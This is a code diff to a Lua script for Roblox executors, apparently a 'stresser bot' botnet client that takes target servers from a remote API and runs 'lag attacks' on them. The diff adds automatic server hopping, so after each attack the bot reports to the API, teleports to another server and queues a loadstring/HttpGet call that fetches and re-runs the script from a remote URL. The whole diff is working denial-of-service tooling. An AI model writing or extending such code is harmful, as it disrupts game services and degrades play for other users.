@@ -43,7 +43,9 @@ local botState = {
     joinTime = 0,
     shouldLeave = false,
     isLagging = false,
-    lagEndTime = 0
+    lagEndTime = 0,
+    currentTaskId = nil,
+    serverHopEnabled = false
 }
 
 -- File handling functions for executor compatibility
@@ -208,7 +210,7 @@ local function syncWithAPI()
         
         -- Return task if one was assigned
         if data.task then
-            log("New target assigned: " .. data.task.placeId .. " | Duration: " .. data.task.duration .. "s")
+            log("New target assigned: " .. data.task.placeId .. " | Duration: " .. data.task.duration .. "s | Server Hop: " .. tostring(data.task.serverHop or false))
             return data.task
         end
         
@@ -216,6 +218,82 @@ local function syncWithAPI()
     else
         log("API sync failed", "ERROR")
         return nil
+    end
+end
+
+-- Server hop completion function
+local function completeServerHop()
+    if not botState.currentTaskId then
+        log("No task ID available for server hop completion", "ERROR")
+        return false
+    end
+    
+    local hopData = {
+        botId = CONFIG.BOT_ID,
+        taskId = botState.currentTaskId
+    }
+    
+    log("Completing server hop for task: " .. botState.currentTaskId, "ATTACK")
+    
+    local success, response = makeRequest("/server-hop-complete", "POST", hopData)
+    
+    if success and response.Success then
+        local data = HttpService:JSONDecode(response.Body)
+        if data.success then
+            log("Server hop completed! Servers lagged: " .. (data.serversLagged or 0), "ATTACK")
+            
+            if data.newTask then
+                log("Got new server hop task: " .. data.newTask.placeId, "ATTACK")
+                -- Store the new task info
+                botState.currentTarget = data.newTask
+                botState.currentDuration = data.newTask.duration or 60
+                botState.currentTaskId = data.newTask.taskId
+                botState.serverHopEnabled = data.newTask.serverHop or false
+                
+                -- Teleport to new server for infinite hopping
+                wait(2)
+                teleportToRandomServer(data.newTask.placeId)
+                return true
+            else
+                log("Server hop complete, no new task - going idle", "ATTACK")
+                botState.status = "online"
+                botState.currentTarget = nil
+                botState.currentTaskId = nil
+                botState.serverHopEnabled = false
+                return true
+            end
+        else
+            log("Server hop completion failed: " .. (data.error or "Unknown error"), "ERROR")
+            return false
+        end
+    else
+        log("Server hop API request failed", "ERROR")
+        return false
+    end
+end
+
+local function teleportToRandomServer(placeId)
+    log("Teleporting to random server for place: " .. placeId, "ATTACK")
+    botState.status = "teleporting"
+    
+    -- Queue the script to re-execute after teleport
+    queueTeleport([[
+        -- Re-execute the stresser bot script
+        loadstring(game:HttpGet("]] .. CONFIG.SCRIPT_URL .. [["))()
+    ]])
+    
+    -- Teleport to a random server of the same place
+    local success, result = pcall(function()
+        TeleportService:Teleport(tonumber(placeId))
+    end)
+    
+    if success then
+        log("Teleport initiated successfully", "ATTACK")
+    else
+        log("Teleport failed: " .. tostring(result), "ERROR")
+        botState.status = "ERROR"
+        botState.currentTarget = nil
+        botState.currentTaskId = nil
     end
 end
 
@@ -401,25 +479,45 @@ local function stopLagging()
     if not botState.isLagging then return end
     
     botState.isLagging = false
-    botState.status = "completed"  -- Use lowercase to match API expectation
     botState.lagEndTime = 0
     
-    log("Lag attack completed, sending completed status to API", "ATTACK")
+    log("Lag attack completed", "ATTACK")
     
     -- Unequip tools
     pcall(function()
-        if player.Character and player.Character:FindFirstChild("Humanoid") then
-            player.Character.Humanoid:UnequipTools()
+        for _, tool in pairs(player.Backpack:GetChildren()) do
+            tool:Destroy()
         end
     end)
     
-    -- Send completed status to API immediately - this should mark the attack as completed
+    -- Check if server hopping is enabled
+    if botState.serverHopEnabled then
+        log("Server hop enabled - completing server hop", "ATTACK")
+        botState.status = "completed"
+        
+        -- Call server hop completion endpoint
+        local success = completeServerHop()
+        if success then
+            log("Server hop process initiated successfully", "ATTACK")
+            -- The completeServerHop function handles teleportation
+            return
+        else
+            log("Server hop failed, falling back to normal completion", "ERROR")
+        end
+    end
+    
+    -- Normal completion (no server hopping)
+    log("Normal attack completion - going idle", "ATTACK")
+    botState.status = "completed"
+    
+    -- Send completed status to API
     syncWithAPI()
     wait(2) -- Give API time to process the completed status
     
     -- Set to idle state after API processes completion
-    botState.status = "online"  -- Use lowercase
+    botState.status = "online"
     botState.currentTarget = nil
+    botState.currentTaskId = nil
     botState.joinTime = 0
     
     -- Send final online status
@@ -440,6 +538,8 @@ local function checkCurrentServer(target)
         log("Already in target server! Starting lag immediately", "ATTACK")
         botState.currentTarget = target
         botState.currentDuration = target.duration or 60
+        botState.currentTaskId = target.taskId
+        botState.serverHopEnabled = target.serverHop or false
         botState.joinTime = tick()
         startLagging()
         return true
@@ -457,6 +557,8 @@ local function executeAttack(target)
     
     botState.currentTarget = target
     botState.currentDuration = target.duration or 60
+    botState.currentTaskId = target.taskId
+    botState.serverHopEnabled = target.serverHop or false
     botState.status = "ATTACKING"
     botState.joinTime = tick()
     
